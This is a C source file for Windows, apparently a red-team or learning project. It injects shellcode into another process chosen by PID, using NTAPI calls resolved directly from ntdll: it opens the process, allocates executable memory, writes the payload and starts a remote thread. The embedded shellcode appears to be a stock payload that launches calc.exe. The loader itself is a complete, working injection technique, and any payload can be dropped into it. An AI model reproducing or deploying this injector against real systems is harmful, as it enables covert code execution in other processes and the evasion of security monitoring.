#include <Windows.h>
#include <stdio.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define okay(msg, ...) printf("[+]" msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*]" msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-]" msg "\n", ##__VA_ARGS__)


/*--------------------------[STRUCTURES]---------------------------*/

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    struct _UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;



/*--------------[FUNCTION PROTOTYPES]------------------*/

typedef NTSTATUS(NTAPI* NtOpenProcess) (
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId
    );

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryEx) ( //  using typedef to define a new type for a function pointer
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG PageProtection,
    _Inout_updates_opt_(ExtendedParameterCount) PMEM_EXTENDED_PARAMETER ExtendedParameters,
    _In_ ULONG ExtendedParameterCount
    );

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(NumberOfBytesToWrite) PVOID Buffer,
    _In_ ULONG NumberOfBytesToWrite, // Changed this from SIZE_T to ULONG (ntdll function not worked in SIZE_T)
    _Out_opt_ PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* NtCreateThreadEx) (
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine, // changed PUSER_THREAD_START_ROUTINE to PVOID
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
    );

typedef NTSTATUS(NTAPI* NtClose) (
    _In_ _Post_ptr_invalid_ HANDLE Handle
    );


int main(int argc, char* argv[]) {
    NTSTATUS STATUS = NULL;
    DWORD PID = 0;
    PVOID rBuffer = NULL;
    HMODULE hNtDLL = NULL;
    HANDLE hThread = NULL;
    HANDLE hProcess = NULL;

    UCHAR shitShellCode[] = 
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    SIZE_T shellcode_size = sizeof(shitShellCode);

    if (argc < 2) {
        warn("usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    HMODULE hNTDLL = GetModuleHandleW(L"ntdll.dll");
    if (hNTDLL != NULL) { okay("got handle to ntdll.dll 0x%p", hNTDLL); }

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL }; // rest field are initialized automatically to NULL(pointer) or 0(int)
    CLIENT_ID CID = { (HANDLE)PID, NULL };

    info("Populating Function Prototypes...");
    NtOpenProcess OpenProc = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemoryEx AllocVirtualMemEx = (NtAllocateVirtualMemoryEx)GetProcAddress(hNTDLL, "NtAllocateVirtualMemoryEx");
    NtWriteVirtualMemory WriteVirtualMem = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadEx CreateThreadExProc = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtClose CloseProc = (NtClose)GetProcAddress(hNTDLL, "NtClose");

    if (!OpenProc || !AllocVirtualMemEx || !WriteVirtualMem || !CreateThreadExProc || !CloseProc) {
        warn("Failed to populate function prototypes.");
        return EXIT_FAILURE;
    }

    okay("finished, beginning injection");

    /*------------------------[OPEN PROCESS]------------------------*/
    STATUS = OpenProc(&hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtOpenProcess] failed, error: 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("got handle to process <%ld>: 0x%p", PID, hProcess);

    /*--------------------[Allocate Virtual Memory]------------------*/
    STATUS = AllocVirtualMemEx(hProcess, &rBuffer, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, NULL, 0);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtAllocateVirtualMemoryEx] failed, error: 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("allocated %zu bytes virtual memory to process: 0x%p",shellcode_size, &hProcess);

    /*--------------------[Write Virtual Memory]------------------*/
    STATUS = WriteVirtualMem(hProcess, rBuffer, shitShellCode, sizeof(shitShellCode), NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtWriteVirtualMemory] failed to write %zu bytes, error: 0x%lx",sizeof(shitShellCode), STATUS);
        return EXIT_FAILURE;
    }
    okay("wrote shell code to the memory");

    /*--------------------[Create Thread]------------------*/
    STATUS = CreateThreadExProc(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtCreateThreadEx] failed, error: 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("thread created, started routine from rBuffer..... waiting for finishing execution");

    WaitForSingleObject(hThread, INFINITE);

    CloseProc(hThread);
    CloseProc(hProcess);

    return EXIT_SUCCESS;
}